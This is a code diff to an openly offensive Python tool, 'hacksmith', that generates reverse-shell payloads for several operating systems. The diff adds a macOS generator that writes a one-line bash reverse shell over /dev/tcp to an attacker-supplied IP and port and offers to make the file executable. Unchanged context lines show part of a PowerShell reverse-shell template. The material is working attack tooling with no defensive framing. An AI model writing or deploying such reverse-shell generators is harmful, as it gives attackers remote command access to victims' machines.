@@ -1,7 +1,9 @@
 import argparse
 import ipaddress
+from os import PRIO_USER
 import sys
 import socket
+import subprocess
 
 
 class Dozer:
@@ -9,19 +11,19 @@ class Dozer:
     tool
     """
 
-    def __init__(self, ip: str, port: int, os: str) -> None:
+    def __init__(self, ip: str, port: int, os: str, output: str) -> None:
         """
         initialization for hacksmith tool
         """
         if not self._check_ip(ip):
             self._error("invalid ip")
         self.ip = ip
-
         self.port = port
         self.os = os
+        self.output_filename = output
 
     def create(self):
-        print("creating tool")
+        print("creating dozer_shell")
         print("-------------")
         print(f"ip = {self.ip}")
         print(f"port = {self.port}")
@@ -36,6 +38,7 @@ class Dozer:
                 print("creating revshell for linux")
             case "mac":
                 print("creating revshell for mac")
+                self.mac_rev_shell()
             case "android":
                 print("creating revshell for android")
             case "ios":
@@ -81,9 +84,20 @@ while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{
 $StreamWriter.Close()
 """
 
-        with open("win_shell.ps1", "w", encoding="utf-8") as f:
+        with open(f"{self.output_filename}.ps1", "w", encoding="utf-8") as f:
             f.write(ps_script)
-            print("created wih_shell.ps1 file")
+            print(f"created {self.output_filename} file")
+
+    def mac_rev_shell(self):
+        mac_script = f"sh -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
+        with open(f"{self.output_filename}.sh", "w", encoding="utf-8") as f:
+            f.write(mac_script)
+            print(f"created {self.output_filename}.sh")
+            user_input = input("do you wanna make it executable (Y/n): ").lower()
+            if user_input == "y":
+                print("making rev shell executable")
+                subprocess.run(["chmod", "+x", f"{self.output_filename}.sh"])
+                print("revshell is now exectuable!")
 
     def _check_ip(self, ip: str):
         try:
@@ -100,12 +114,13 @@ $StreamWriter.Close()
 def main():
     parser = argparse.ArgumentParser(
         prog="hacksmith",
-        description="tool for making rev shells across all devices",
+        description="tool for making crossplaftform revshells",
         epilog="made by n0_sh4d3",
     )
 
     parser.add_argument("--ip", help="home ip address")
     parser.add_argument("--port", help="port number")
+    parser.add_argument("--output", help="name for output revshell file")
     parser.add_argument(
         "--os",
         help="target os",
@@ -131,7 +146,9 @@ def main():
     if args.port > 65535:
         print("port cannot be higher than 65535")
 
-    tool = Dozer(ip=args.ip, port=args.port, os=args.os)
+    if args.output is None:
+        args.output = "rev_shell"
+    tool = Dozer(ip=args.ip, port=args.port, os=args.os, output=args.output)
     tool.create()
 
 
